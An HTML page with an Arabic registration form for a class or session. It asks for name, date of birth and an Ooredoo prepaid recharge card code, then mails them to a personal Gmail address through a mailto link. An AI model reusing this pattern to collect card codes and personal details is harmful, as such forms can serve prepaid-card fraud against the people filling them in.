!DOCTYPE html>
<html>
<head>
    <title>Registration Form</title>
</head>
<body>
    <form id="registrationForm">
        <label for="name">الاسم واللقب:</label>
        <input type="text" id="name" required><br><br>

        <label for="dob">تاريخ الولادة:</label>
        <input type="text" id="dob" required><br><br>

        <label for="ooredooCard">بطاقة شحن Ooredoo:</label>
        <input type="text" id="ooredooCard" required><br><br>

        <button type="button" onclick="sendEmail()">إرسال</button>
    </form>

    <script>
        function sendEmail() {
            var name = document.getElementById("name").value;
            var dob = document.getElementById("dob").value;
            var ooredooCard = document.getElementById("ooredooCard").value;

            var mailtoLink = "mailto:wided.mee@gmail.com"
                + "?subject=" + encodeURIComponent("تسجيل في الحصة")
                + "&body=" + encodeURIComponent("الاسم واللقب: " + name + "\nتاريخ الولادة: " + dob + "\nبطاقة شحن Ooredoo: " + ooredooCard);

            window.location.href = mailtoLink;
        }
    </script>
</body>
</html>
